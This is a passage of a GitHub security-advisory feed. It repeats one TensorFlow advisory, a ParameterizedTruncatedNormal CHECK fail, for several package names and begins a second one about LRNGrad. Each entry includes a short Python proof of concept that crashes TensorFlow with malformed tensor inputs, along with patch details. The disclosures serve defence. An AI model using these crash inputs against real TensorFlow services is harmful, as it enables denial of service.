            <uri>https://github.com/advisories/GHSA-p2xf-8hgm-hpw5</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-09-16T22:30:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow-gpu] TensorFlow vulnerable to `CHECK` fail in `ParameterizedTruncatedNormal`]]></title>
        <id>https://github.com/advisories/GHSA-p2xf-8hgm-hpw5</id>
        <link href="https://github.com/advisories/GHSA-p2xf-8hgm-hpw5"/>
        <updated>2022-09-16T22:30:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><code>ParameterizedTruncatedNormal</code> assumes <code>shape</code> is of type <code>int32</code>. A valid <code>shape</code> of type <code>int64</code> results in a mismatched type <code>CHECK</code> fail that can be used to trigger a denial of service attack.</p>
<pre><code class="language-python">import tensorflow as tf
seed = 1618
seed2 = 0
shape = tf.random.uniform(shape=[3], minval=-10000, maxval=10000, dtype=tf.int64, seed=4894)
means = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
stdevs = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
minvals = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
maxvals = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
tf.raw_ops.ParameterizedTruncatedNormal(shape=shape, means=means, stdevs=stdevs, minvals=minvals, maxvals=maxvals, seed=seed, seed2=seed2)
</code></pre>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/72180be03447a10810edca700cbc9af690dfeb51">72180be03447a10810edca700cbc9af690dfeb51</a>.</p>
<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p2xf-8hgm-hpw5">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p2xf-8hgm-hpw5</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/72180be03447a10810edca700cbc9af690dfeb51">https://github.com/tensorflow/tensorflow/commit/72180be03447a10810edca700cbc9af690dfeb51</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-p2xf-8hgm-hpw5">https://github.com/advisories/GHSA-p2xf-8hgm-hpw5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p2xf-8hgm-hpw5</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-09-16T22:30:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow-gpu] TensorFlow vulnerable to `CHECK` fail in `ParameterizedTruncatedNormal`]]></title>
        <id>https://github.com/advisories/GHSA-p2xf-8hgm-hpw5</id>
        <link href="https://github.com/advisories/GHSA-p2xf-8hgm-hpw5"/>
        <updated>2022-09-16T22:30:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><code>ParameterizedTruncatedNormal</code> assumes <code>shape</code> is of type <code>int32</code>. A valid <code>shape</code> of type <code>int64</code> results in a mismatched type <code>CHECK</code> fail that can be used to trigger a denial of service attack.</p>
<pre><code class="language-python">import tensorflow as tf
seed = 1618
seed2 = 0
shape = tf.random.uniform(shape=[3], minval=-10000, maxval=10000, dtype=tf.int64, seed=4894)
means = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
stdevs = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
minvals = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
maxvals = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
tf.raw_ops.ParameterizedTruncatedNormal(shape=shape, means=means, stdevs=stdevs, minvals=minvals, maxvals=maxvals, seed=seed, seed2=seed2)
</code></pre>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/72180be03447a10810edca700cbc9af690dfeb51">72180be03447a10810edca700cbc9af690dfeb51</a>.</p>
<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p2xf-8hgm-hpw5">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p2xf-8hgm-hpw5</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/72180be03447a10810edca700cbc9af690dfeb51">https://github.com/tensorflow/tensorflow/commit/72180be03447a10810edca700cbc9af690dfeb51</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-p2xf-8hgm-hpw5">https://github.com/advisories/GHSA-p2xf-8hgm-hpw5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p2xf-8hgm-hpw5</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-09-16T22:30:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow-cpu] TensorFlow vulnerable to `CHECK` fail in `ParameterizedTruncatedNormal`]]></title>
        <id>https://github.com/advisories/GHSA-p2xf-8hgm-hpw5</id>
        <link href="https://github.com/advisories/GHSA-p2xf-8hgm-hpw5"/>
        <updated>2022-09-16T22:30:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><code>ParameterizedTruncatedNormal</code> assumes <code>shape</code> is of type <code>int32</code>. A valid <code>shape</code> of type <code>int64</code> results in a mismatched type <code>CHECK</code> fail that can be used to trigger a denial of service attack.</p>
<pre><code class="language-python">import tensorflow as tf
seed = 1618
seed2 = 0
shape = tf.random.uniform(shape=[3], minval=-10000, maxval=10000, dtype=tf.int64, seed=4894)
means = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
stdevs = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
minvals = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
maxvals = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
tf.raw_ops.ParameterizedTruncatedNormal(shape=shape, means=means, stdevs=stdevs, minvals=minvals, maxvals=maxvals, seed=seed, seed2=seed2)
</code></pre>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/72180be03447a10810edca700cbc9af690dfeb51">72180be03447a10810edca700cbc9af690dfeb51</a>.</p>
<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p2xf-8hgm-hpw5">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p2xf-8hgm-hpw5</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/72180be03447a10810edca700cbc9af690dfeb51">https://github.com/tensorflow/tensorflow/commit/72180be03447a10810edca700cbc9af690dfeb51</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-p2xf-8hgm-hpw5">https://github.com/advisories/GHSA-p2xf-8hgm-hpw5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p2xf-8hgm-hpw5</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-09-16T22:30:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow-cpu] TensorFlow vulnerable to `CHECK` fail in `ParameterizedTruncatedNormal`]]></title>
        <id>https://github.com/advisories/GHSA-p2xf-8hgm-hpw5</id>
        <link href="https://github.com/advisories/GHSA-p2xf-8hgm-hpw5"/>
        <updated>2022-09-16T22:30:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><code>ParameterizedTruncatedNormal</code> assumes <code>shape</code> is of type <code>int32</code>. A valid <code>shape</code> of type <code>int64</code> results in a mismatched type <code>CHECK</code> fail that can be used to trigger a denial of service attack.</p>
<pre><code class="language-python">import tensorflow as tf
seed = 1618
seed2 = 0
shape = tf.random.uniform(shape=[3], minval=-10000, maxval=10000, dtype=tf.int64, seed=4894)
means = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
stdevs = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
minvals = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
maxvals = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
tf.raw_ops.ParameterizedTruncatedNormal(shape=shape, means=means, stdevs=stdevs, minvals=minvals, maxvals=maxvals, seed=seed, seed2=seed2)
</code></pre>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/72180be03447a10810edca700cbc9af690dfeb51">72180be03447a10810edca700cbc9af690dfeb51</a>.</p>
<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p2xf-8hgm-hpw5">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p2xf-8hgm-hpw5</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/72180be03447a10810edca700cbc9af690dfeb51">https://github.com/tensorflow/tensorflow/commit/72180be03447a10810edca700cbc9af690dfeb51</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-p2xf-8hgm-hpw5">https://github.com/advisories/GHSA-p2xf-8hgm-hpw5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p2xf-8hgm-hpw5</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-09-16T22:30:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow-cpu] TensorFlow vulnerable to `CHECK` fail in `ParameterizedTruncatedNormal`]]></title>
        <id>https://github.com/advisories/GHSA-p2xf-8hgm-hpw5</id>
        <link href="https://github.com/advisories/GHSA-p2xf-8hgm-hpw5"/>
        <updated>2022-09-16T22:30:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><code>ParameterizedTruncatedNormal</code> assumes <code>shape</code> is of type <code>int32</code>. A valid <code>shape</code> of type <code>int64</code> results in a mismatched type <code>CHECK</code> fail that can be used to trigger a denial of service attack.</p>
<pre><code class="language-python">import tensorflow as tf
seed = 1618
seed2 = 0
shape = tf.random.uniform(shape=[3], minval=-10000, maxval=10000, dtype=tf.int64, seed=4894)
means = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
stdevs = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
minvals = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
maxvals = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
tf.raw_ops.ParameterizedTruncatedNormal(shape=shape, means=means, stdevs=stdevs, minvals=minvals, maxvals=maxvals, seed=seed, seed2=seed2)
</code></pre>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/72180be03447a10810edca700cbc9af690dfeb51">72180be03447a10810edca700cbc9af690dfeb51</a>.</p>
<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p2xf-8hgm-hpw5">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p2xf-8hgm-hpw5</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/72180be03447a10810edca700cbc9af690dfeb51">https://github.com/tensorflow/tensorflow/commit/72180be03447a10810edca700cbc9af690dfeb51</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-p2xf-8hgm-hpw5">https://github.com/advisories/GHSA-p2xf-8hgm-hpw5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p2xf-8hgm-hpw5</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-09-16T22:30:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow] TensorFlow vulnerable to `CHECK` fail in `ParameterizedTruncatedNormal`]]></title>
        <id>https://github.com/advisories/GHSA-p2xf-8hgm-hpw5</id>
        <link href="https://github.com/advisories/GHSA-p2xf-8hgm-hpw5"/>
        <updated>2022-09-16T22:30:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><code>ParameterizedTruncatedNormal</code> assumes <code>shape</code> is of type <code>int32</code>. A valid <code>shape</code> of type <code>int64</code> results in a mismatched type <code>CHECK</code> fail that can be used to trigger a denial of service attack.</p>
<pre><code class="language-python">import tensorflow as tf
seed = 1618
seed2 = 0
shape = tf.random.uniform(shape=[3], minval=-10000, maxval=10000, dtype=tf.int64, seed=4894)
means = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
stdevs = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
minvals = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
maxvals = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
tf.raw_ops.ParameterizedTruncatedNormal(shape=shape, means=means, stdevs=stdevs, minvals=minvals, maxvals=maxvals, seed=seed, seed2=seed2)
</code></pre>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/72180be03447a10810edca700cbc9af690dfeb51">72180be03447a10810edca700cbc9af690dfeb51</a>.</p>
<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p2xf-8hgm-hpw5">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p2xf-8hgm-hpw5</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/72180be03447a10810edca700cbc9af690dfeb51">https://github.com/tensorflow/tensorflow/commit/72180be03447a10810edca700cbc9af690dfeb51</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-p2xf-8hgm-hpw5">https://github.com/advisories/GHSA-p2xf-8hgm-hpw5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p2xf-8hgm-hpw5</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-09-16T22:30:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow] TensorFlow vulnerable to `CHECK` fail in `ParameterizedTruncatedNormal`]]></title>
        <id>https://github.com/advisories/GHSA-p2xf-8hgm-hpw5</id>
        <link href="https://github.com/advisories/GHSA-p2xf-8hgm-hpw5"/>
        <updated>2022-09-16T22:30:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><code>ParameterizedTruncatedNormal</code> assumes <code>shape</code> is of type <code>int32</code>. A valid <code>shape</code> of type <code>int64</code> results in a mismatched type <code>CHECK</code> fail that can be used to trigger a denial of service attack.</p>
<pre><code class="language-python">import tensorflow as tf
seed = 1618
seed2 = 0
shape = tf.random.uniform(shape=[3], minval=-10000, maxval=10000, dtype=tf.int64, seed=4894)
means = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
stdevs = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
minvals = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
maxvals = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
tf.raw_ops.ParameterizedTruncatedNormal(shape=shape, means=means, stdevs=stdevs, minvals=minvals, maxvals=maxvals, seed=seed, seed2=seed2)
</code></pre>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/72180be03447a10810edca700cbc9af690dfeb51">72180be03447a10810edca700cbc9af690dfeb51</a>.</p>
<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p2xf-8hgm-hpw5">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p2xf-8hgm-hpw5</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/72180be03447a10810edca700cbc9af690dfeb51">https://github.com/tensorflow/tensorflow/commit/72180be03447a10810edca700cbc9af690dfeb51</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-p2xf-8hgm-hpw5">https://github.com/advisories/GHSA-p2xf-8hgm-hpw5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p2xf-8hgm-hpw5</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-09-16T22:30:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow] TensorFlow vulnerable to `CHECK` fail in `ParameterizedTruncatedNormal`]]></title>
        <id>https://github.com/advisories/GHSA-p2xf-8hgm-hpw5</id>
        <link href="https://github.com/advisories/GHSA-p2xf-8hgm-hpw5"/>
        <updated>2022-09-16T22:30:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><code>ParameterizedTruncatedNormal</code> assumes <code>shape</code> is of type <code>int32</code>. A valid <code>shape</code> of type <code>int64</code> results in a mismatched type <code>CHECK</code> fail that can be used to trigger a denial of service attack.</p>
<pre><code class="language-python">import tensorflow as tf
seed = 1618
seed2 = 0
shape = tf.random.uniform(shape=[3], minval=-10000, maxval=10000, dtype=tf.int64, seed=4894)
means = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
stdevs = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
minvals = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
maxvals = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
tf.raw_ops.ParameterizedTruncatedNormal(shape=shape, means=means, stdevs=stdevs, minvals=minvals, maxvals=maxvals, seed=seed, seed2=seed2)
</code></pre>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/72180be03447a10810edca700cbc9af690dfeb51">72180be03447a10810edca700cbc9af690dfeb51</a>.</p>
<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p2xf-8hgm-hpw5">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p2xf-8hgm-hpw5</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/72180be03447a10810edca700cbc9af690dfeb51">https://github.com/tensorflow/tensorflow/commit/72180be03447a10810edca700cbc9af690dfeb51</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-p2xf-8hgm-hpw5">https://github.com/advisories/GHSA-p2xf-8hgm-hpw5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p2xf-8hgm-hpw5</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-09-16T22:30:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow-gpu] TensorFlow vulnerable to `CHECK` fail in `LRNGrad`]]></title>
        <id>https://github.com/advisories/GHSA-9942-r22v-78cp</id>
        <link href="https://github.com/advisories/GHSA-9942-r22v-78cp"/>
        <updated>2022-09-16T22:29:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>If <code>LRNGrad</code> is given an <code>output_image</code> input tensor that is not 4-D, it results in a <code>CHECK</code> fail that can be used to trigger a denial of service attack.</p>
<pre><code class="language-python">import tensorflow as tf
depth_radius = 1
bias = 1.59018219
alpha = 0.117728651
beta = 0.404427052
input_grads = tf.random.uniform(shape=[4, 4, 4, 4], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2033)
input_image = tf.random.uniform(shape=[4, 4, 4, 4], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2033)
output_image = tf.random.uniform(shape=[4, 4, 4, 4, 4, 4], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2033)
tf.raw_ops.LRNGrad(input_grads=input_grads, input_image=input_image, output_image=output_image, depth_radius=depth_radius, bias=bias, alpha=alpha, beta=beta)
</code></pre>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/bd90b3efab4ec958b228cd7cfe9125be1c0cf255">bd90b3efab4ec958b228cd7cfe9125be1c0cf255</a>.</p>
<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9942-r22v-78cp">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9942-r22v-78cp</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/bd90b3efab4ec958b228cd7cfe9125be1c0cf255">https://github.com/tensorflow/tensorflow/commit/bd90b3efab4ec958b228cd7cfe9125be1c0cf255</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-9942-r22v-78cp">https://github.com/advisories/GHSA-9942-r22v-78cp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9942-r22v-78cp</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-09-16T22:29:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow-gpu] TensorFlow vulnerable to `CHECK` fail in `LRNGrad`]]></title>
        <id>https://github.com/advisories/GHSA-9942-r22v-78cp</id>
        <link href="https://github.com/advisories/GHSA-9942-r22v-78cp"/>
        <updated>2022-09-16T22:29:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>If <code>LRNGrad</code> is given an <code>output_image</code> input tensor that is not 4-D, it results in a <code>CHECK</code> fail that can be used to trigger a denial of service attack.</p>
<pre><code class="language-python">import tensorflow as tf
depth_radius = 1
bias = 1.59018219
alpha = 0.117728651
beta = 0.404427052
input_grads = tf.random.uniform(shape=[4, 4, 4, 4], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2033)
input_image = tf.random.uniform(shape=[4, 4, 4, 4], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2033)
output_image = tf.random.uniform(shape=[4, 4, 4, 4, 4, 4], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2033)
tf.raw_ops.LRNGrad(input_grads=input_grads, input_image=input_image, output_image=output_image, depth_radius=depth_radius, bias=bias, alpha=alpha, beta=beta)
</code></pre>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/bd90b3efab4ec958b228cd7cfe9125be1c0cf255">bd90b3efab4ec958b228cd7cfe9125be1c0cf255</a>.</p>
<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
